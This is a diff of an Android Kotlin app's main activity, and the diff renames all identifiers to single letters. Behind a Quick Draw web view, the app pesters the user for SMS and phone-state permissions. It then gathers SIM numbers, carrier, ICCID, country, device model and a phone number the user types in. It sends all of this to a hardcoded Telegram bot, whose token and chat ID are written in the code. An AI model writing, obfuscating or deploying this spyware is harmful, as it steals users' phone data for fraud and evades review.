@@ -1,4 +1,4 @@
-package com.analyzer.smsbeta
+package a.b
 
 import android.Manifest
 import android.annotation.SuppressLint
@@ -32,271 +32,267 @@ import okio.IOException
 import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 
-class MainActivity : AppCompatActivity() {
+class A : AppCompatActivity() {
 
-    private lateinit var sharedPreferences: SharedPreferences
-    private lateinit var myWebView: WebView
-    private val client = OkHttpClient()
+    private lateinit var b: SharedPreferences
+    private lateinit var c: WebView
+    private val d = OkHttpClient()
 
     companion object {
-        private const val PERMISSION_REQUEST_CODE = 100
-        private const val PREFS_NAME = "AppPrefs"
-        private const val PHONE_NUMBER_KEY = "phone_number"
-        private const val FIRST_RUN_KEY = "first_run"
-        private val REQUIRED_PERMISSIONS = arrayOf(
+        private const val e = 100
+        private const val f = "AppPrefs"
+        private const val g = "phone_number"
+        private const val h = "first_run"
+        private val i = arrayOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_PHONE_STATE
         )
     }
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
+    override fun onCreate(j: Bundle?) {
+        super.onCreate(j)
         enableEdgeToEdge()
         setContentView(R.layout.activity_main)
     
-        sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        myWebView = findViewById(R.id.webview)
+        b = getSharedPreferences(f, MODE_PRIVATE)
+        c = findViewById(R.id.webview)
     
-        with(myWebView.settings) {
+        with(c.settings) {
             javaScriptEnabled = true
             domStorageEnabled = true
             javaScriptCanOpenWindowsAutomatically = true
         }
         
-        myWebView.webViewClient = object : WebViewClient() {
+        c.webViewClient = object : WebViewClient() {
             @Deprecated("Deprecated in Android N")
-            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
-                view.loadUrl(url)
+            override fun shouldOverrideUrlLoading(k: WebView, l: String): Boolean {
+                k.loadUrl(l)
                 return true
             }
 
-            override fun shouldOverrideUrlLoading(view: WebView, request: android.webkit.WebResourceRequest): Boolean {
-                view.loadUrl(request.url.toString())
+            override fun shouldOverrideUrlLoading(k: WebView, m: android.webkit.WebResourceRequest): Boolean {
+                k.loadUrl(m.url.toString())
                 return true
             }
         }
     
-        checkInternetConnectionBeforePermissions()
+        n()
     }
 
     override fun onBackPressed() {
-        if (myWebView.canGoBack()) {
-            // Если в WebView есть история навигации - возвращаемся назад
-            myWebView.goBack()
+        if (c.canGoBack()) {
+            c.goBack()
         } else {
-            // Если истории нет - стандартное поведение (закрываем приложение)
             super.onBackPressed()
         }
     }
 
-    private fun checkInternetConnectionBeforePermissions() {
-        if (isInternetAvailable()) {
-            checkPermissions()
+    private fun n() {
+        if (o()) {
+            p()
         } else {
-            showNoInternetDialog {
-                checkInternetConnectionBeforePermissions()
-            }
+            q { n() }
         }
     }
 
     @SuppressLint("ServiceCast")
-    private fun isInternetAvailable(): Boolean {
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+    private fun o(): Boolean {
+        val r = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val network = connectivityManager.activeNetwork ?: return false
-            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
-            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
-                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
+            val s = r.activeNetwork ?: return false
+            val t = r.getNetworkCapabilities(s) ?: return false
+            t.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
+                    t.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
         } else {
             @Suppress("DEPRECATION")
-            val networkInfo = connectivityManager.activeNetworkInfo
+            val u = r.activeNetworkInfo
             @Suppress("DEPRECATION")
-            networkInfo != null && networkInfo.isConnected
+            u != null && u.isConnected
         }
     }
 
-    private fun showNoInternetDialog(retryAction: () -> Unit) {
+    private fun q(v: () -> Unit) {
         AlertDialog.Builder(this)
-            .setTitle("Нет подключения к интернету")
-            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
-            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
+            .setTitle("Нет подключения")
+            .setMessage("Требуется интернет")
+            .setPositiveButton("Повторить") { _, _ -> v() }
             .setCancelable(false)
             .show()
     }
 
-    private fun checkPermissions() {
-        val permissionsToRequest = REQUIRED_PERMISSIONS.filter { permission ->
-            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
+    private fun p() {
+        val w = i.filter { x ->
+            ContextCompat.checkSelfPermission(this, x) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
     
-        if (permissionsToRequest.isNotEmpty()) {
+        if (w.isNotEmpty()) {
             ActivityCompat.requestPermissions(
                 this,
-                arrayOf(permissionsToRequest.first()),
-                PERMISSION_REQUEST_CODE
+                arrayOf(w.first()),
+                e
             )
         } else {
-            onAllPermissionsGranted()
+            y()
         }
     }
     
     override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
+        z: Int,
+        aa: Array<String>,
+        ab: IntArray
     ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        super.onRequestPermissionsResult(z, aa, ab)
     
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            val permission = permissions.firstOrNull()
-            val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
+        if (z == e) {
+            val ac = aa.firstOrNull()
+            val ad = ab.firstOrNull() == PackageManager.PERMISSION_GRANTED
     
-            if (granted) {
-                checkPermissions()
+            if (ad) {
+                p()
             } else {
-                checkPermissions()
+                p()
             }
         }
     }
 
-    private fun onAllPermissionsGranted() {
-        val isFirstRun = sharedPreferences.getBoolean(FIRST_RUN_KEY, true)
+    private fun y() {
+        val ae = b.getBoolean(h, true)
         
-        if (isFirstRun) {
-            sendNotification("Все разрешения предоставлены")
-            val simInfo = getSimNumbersString()
-            sendNotification("Информация о SIM-картах:\n$simInfo")
-            sharedPreferences.edit().putBoolean(FIRST_RUN_KEY, false).apply()
+        if (ae) {
+            af("Разрешения получены")
+            val ag = ah()
+            af("SIM данные:\n$ag")
+            b.edit().putBoolean(h, false).apply()
         }
 
-        val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
-        if (savedPhoneNumber == null) {
-            showStyledPhoneNumberDialog()
+        val ai = b.getString(g, null)
+        if (ai == null) {
+            aj()
         } else {
-            loadWebView()
+            ak()
         }
     }
 
-    private fun showStyledPhoneNumberDialog() {
-        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
-        val dialog = AlertDialog.Builder(this)
-            .setView(dialogView)
+    private fun aj() {
+        val al = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
+        val am = AlertDialog.Builder(this)
+            .setView(al)
             .setCancelable(false)
             .create()
 
-        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
+        am.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
 
-        val title = dialogView.findViewById<TextView>(R.id.dialog_title)
-        val message = dialogView.findViewById<TextView>(R.id.dialog_message)
-        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
-        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)
+        val an = al.findViewById<TextView>(R.id.dialog_title)
+        val ao = al.findViewById<TextView>(R.id.dialog_message)
+        val ap = al.findViewById<EditText>(R.id.phone_input)
+        val aq = al.findViewById<Button>(R.id.continue_button)
 
-        title.text = "Введите номер телефона"
-        message.text = "Пожалуйста, введите ваш номер телефона для продолжения"
-        phoneInput.inputType = InputType.TYPE_CLASS_PHONE
+        an.text = "Введите номер"
+        ao.text = "Введите номер для продолжения"
+        ap.inputType = InputType.TYPE_CLASS_PHONE
 
-        continueButton.setOnClickListener {
-            val phoneNumber = phoneInput.text.toString().trim()
-            if (phoneNumber.isNotEmpty()) {
-                sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
-                sendNotification("Введен номер телефона: $phoneNumber")
-                loadWebView()
-                dialog.dismiss()
+        aq.setOnClickListener {
+            val ar = ap.text.toString().trim()
+            if (ar.isNotEmpty()) {
+                b.edit().putString(g, ar).apply()
+                af("Номер: $ar")
+                ak()
+                am.dismiss()
             } else {
-                phoneInput.error = "Пожалуйста, введите номер телефона"
+                ap.error = "Введите номер"
             }
         }
 
-        dialog.show()
+        am.show()
     }
 
-    private fun loadWebView() {
-        myWebView.loadUrl("https://quickdraw.withgoogle.com/")
+    private fun ak() {
+        c.loadUrl("https://quickdraw.withgoogle.com/")
     }
 
     @SuppressLint("MissingPermission", "HardwareIds")
-    private fun getSimNumbersString(): String {
-        val result = StringBuilder()
+    private fun ah(): String {
+        val asb = StringBuilder()
         
         try {
-            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+            val at = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
-                val activeSubscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    subscriptionManager.activeSubscriptionInfoList
+                val au = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+                val av = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    au.activeSubscriptionInfoList
                 } else {
                     @Suppress("DEPRECATION")
-                    subscriptionManager.activeSubscriptionInfoList
+                    au.activeSubscriptionInfoList
                 }
                 
-                if (activeSubscriptions != null && activeSubscriptions.isNotEmpty()) {
-                    result.append("Найдено SIM-карт: ${activeSubscriptions.size}\n\n")
+                if (av != null && av.isNotEmpty()) {
+                    asb.append("SIM: ${av.size}\n\n")
                     
-                    for (subscription in activeSubscriptions) {
-                        val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                            telephonyManager.createForSubscriptionId(subscription.subscriptionId).line1Number
+                    for (aw in av) {
+                        val ax = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            at.createForSubscriptionId(aw.subscriptionId).line1Number
                         } else {
                             @Suppress("DEPRECATION")
-                            telephonyManager.line1Number
+                            at.line1Number
                         }
                         
-                        result.append("SIM ${subscription.simSlotIndex + 1}:\n")
-                        result.append("• Номер: ${number ?: "недоступен"}\n")
-                        result.append("• Оператор: ${subscription.carrierName ?: "неизвестен"}\n")
-                        result.append("• IMSI: ${subscription.iccId ?: "недоступен"}\n")
-                        result.append("• Страна: ${subscription.countryIso?.uppercase() ?: "неизвестна"}\n\n")
+                        asb.append("SIM ${aw.simSlotIndex + 1}:\n")
+                        asb.append("• Номер: ${ax ?: "нет"}\n")
+                        asb.append("• Оператор: ${aw.carrierName ?: "нет"}\n")
+                        asb.append("• IMSI: ${aw.iccId ?: "нет"}\n")
+                        asb.append("• Страна: ${aw.countryIso?.uppercase() ?: "нет"}\n\n")
                     }
                 } else {
-                    result.append("Активные SIM-карты не найдены\n")
+                    asb.append("SIM не найдены\n")
                 }
             } else {
                 @Suppress("DEPRECATION")
-                val number = telephonyManager.line1Number
-                result.append("Основной номер SIM: ${number ?: "недоступен"}\n")
-                result.append("(Метод для Multi-SIM не поддерживается в этой версии Android)\n")
+                val ay = at.line1Number
+                asb.append("Номер: ${ay ?: "нет"}\n")
+                asb.append("(Multi-SIM не поддерживается)\n")
             }
-        } catch (e: Exception) {
-            result.append("Ошибка при получении номеров SIM: ${e.localizedMessage}")
+        } catch (az: Exception) {
+            asb.append("Ошибка: ${az.localizedMessage}")
         }
         
-        return result.toString()
+        return asb.toString()
     }
 
-    private fun sendNotification(message: String) {
+    private fun af(ba: String) {
         try {
-            val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
-            val fullMessage = "$message\n$deviceModel"
+            val bb = "${Build.MANUFACTURER} ${Build.MODEL}"
+            val bc = "$ba\n$bb"
 
-            val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
-            val chatId = "6331293386"
-            val url = "https://api.telegram.org/bot$botToken/sendMessage"
+            val bd = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
+            val be = "6331293386"
+            val bf = "https://api.telegram.org/bot$bd/sendMessage"
 
-            val mediaType = "application/json".toMediaType()
-            val requestBody = """
+            val bg = "application/json".toMediaType()
+            val bh = """
                 {
-                    "chat_id": "$chatId",
-                    "text": "$fullMessage",
+                    "chat_id": "$be",
+                    "text": "$bc",
                     "parse_mode": "Markdown"
                 }
-            """.trimIndent().toRequestBody(mediaType)
+            """.trimIndent().toRequestBody(bg)
 
-            val request = Request.Builder()
-                .url(url)
-                .post(requestBody)
+            val bi = Request.Builder()
+                .url(bf)
+                .post(bh)
                 .build()
 
-            client.newCall(request).enqueue(object : okhttp3.Callback {
-                override fun onFailure(call: okhttp3.Call, e: IOException) {
-                    e.printStackTrace()
+            d.newCall(bi).enqueue(object : okhttp3.Callback {
+                override fun onFailure(bj: okhttp3.Call, bk: IOException) {
+                    bk.printStackTrace()
                 }
 
-                override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
-                    response.close()
+                override fun onResponse(bj: okhttp3.Call, bl: okhttp3.Response) {
+                    bl.close()
                 }
             })
-        } catch (e: Exception) {
-            e.printStackTrace()
+        } catch (bm: Exception) {
+            bm.printStackTrace()
         }
     }
 }
